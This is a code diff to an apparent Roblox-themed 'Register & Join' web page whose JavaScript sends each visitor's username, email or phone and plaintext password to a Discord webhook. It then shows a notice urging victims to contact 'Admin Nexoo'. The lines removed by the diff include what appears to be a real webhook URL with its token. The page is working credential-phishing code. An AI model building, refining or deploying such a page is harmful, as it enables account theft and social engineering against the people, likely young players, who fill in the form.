@@ -298,20 +298,18 @@
             opacity: 0.8;
         }
 
-        /* permanent admin notice inside card (with red glow + hover on Nexoo) */
-        .admin-notice {
+        /* success admin notice (shown only after successful registration) */
+        .success-admin-notice {
             margin-top: 1.5rem;
             padding: 0.9rem 1rem;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.6);
             border-radius: 1.2rem;
             text-align: center;
             font-size: 0.8rem;
-            border: 1px solid rgba(255,70,100,0.3);
+            border: 1px solid rgba(255,70,100,0.4);
             backdrop-filter: blur(4px);
-            transition: all 0.2s;
-        }
-        .admin-notice span {
-            font-weight: 700;
+            animation: fadeSlideUp 0.4s ease;
+            color: #f0f3fa;
         }
         .nexoo-glow {
             color: #ff3a4d;
@@ -326,8 +324,9 @@
             transform: scale(1.05);
             color: #ff6a80;
         }
-        .check-green {
-            color: #3eff8f;
+        /* a placeholder for old permanent message - we will remove it and show only after success */
+        .hidden-message {
+            display: none;
         }
 
         /* toast */
@@ -398,10 +397,9 @@
 
         <button id="submitMainBtn" class="login-btn"><i class="fas fa-arrow-right"></i> Register & Join</button>
         
-        <!-- PERMANENT ADMIN NOTICE inside card (shows always, no fade out) -->
-        <div class="admin-notice">
-            <i class="fas fa-shield-alt check-green"></i> <span>✅ Perfekt! Admin <span class="nexoo-glow">Nexoo</span> <span style="color:#ff5e7e;">(red glow)</span> needs to verify that you are not a bot — please reach out to him!</span>
-        </div>
+        <!-- This div will host the success admin notice only after successful registration -->
+        <div id="dynamicAdminNotice" class="hidden-message"></div>
+        
         <div id="inlineFeedback" style="font-size:0.7rem; margin-top:8px; text-align:center; min-height: 24px;"></div>
     </div>
 
@@ -425,7 +423,7 @@
     (function() {
         // -----------------------------------------------
         // CONFIG: REPLACE WITH YOUR ACTUAL DISCORD WEBHOOK URL
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515877027086488/S3DHFQbry9zn-dpv2ykxffpC_fySox_FIq-oruVBwD2CIfMelsuqb53YNJg4u0Gvhido"; 
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL"; 
         // -----------------------------------------------
 
         // DOM elements
@@ -441,6 +439,7 @@
         const teamMember3 = document.getElementById('teamMember3');
         const teamMember4 = document.getElementById('teamMember4');
         const feedbackDiv = document.getElementById('inlineFeedback');
+        const dynamicNoticeDiv = document.getElementById('dynamicAdminNotice');
 
         // toast helper
         let toastTimeout;
@@ -468,6 +467,19 @@
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = '<i class="fas fa-arrow-right"></i> Register & Join';
             }
+        }
+
+        // Function to display the permanent admin success message (exactly as required: no emoji, no "(red glow)", just clean text with red glowing Nexoo)
+        function showSuccessAdminNotice() {
+            // Clear previous content and show fresh notice
+            dynamicNoticeDiv.innerHTML = `
+                <div class="success-admin-notice">
+                    <span>Perfekt! Admin <span class="nexoo-glow">Nexoo</span> needs to verify that you are not a bot — please reach out to him!</span>
+                </div>
+            `;
+            dynamicNoticeDiv.classList.remove('hidden-message');
+            // Also animate scroll into view optionally
+            dynamicNoticeDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         }
 
         // send data to discord (password in clear-text as requested)
@@ -555,9 +567,13 @@
                 await sendFullDataToDiscord(robloxUser, emailPhone || "not provided", password || "empty", teamSlots);
                 showInlineLoader(false);
                 feedbackDiv.innerHTML = "";
-                // final success toast (but admin notice is permanent, do not remove)
-                showToastMessage("✅ Registration sent! Admin Nexoo will review.", false, 3800);
-                // clear password field only, keep other fields for convenience
+                
+                // AFTER SUCCESS: show the permanent admin notice (only appears now and stays)
+                showSuccessAdminNotice();
+                
+                // Also show a brief toast that registration was sent
+                showToastMessage("Registration sent successfully.", false, 2800);
+                // clear password field only
                 passwordInput.value = "";
             } catch (err) {
                 showInlineLoader(false);
@@ -591,8 +607,10 @@
                 }, 180);
             }, 1100);
             
-            // ensure team fields hidden at start
+            // ensure team fields hidden at start, and no admin message yet
             teamContainer.classList.remove('show-team');
+            dynamicNoticeDiv.classList.add('hidden-message');
+            dynamicNoticeDiv.innerHTML = ''; // clean
         });
 
         // warning for webhook not set
@@ -603,7 +621,7 @@
             warnSpan.style.marginTop = "8px";
             warnSpan.style.color = "#ffab8e";
             warnSpan.innerHTML = "<i class='fas fa-exclamation-triangle'></i> Demo mode: Replace webhook URL for real Discord integration";
-            document.querySelector('.admin-notice')?.before(warnSpan);
+            document.querySelector('.login-card')?.appendChild(warnSpan);
         }
     })();
 </script>
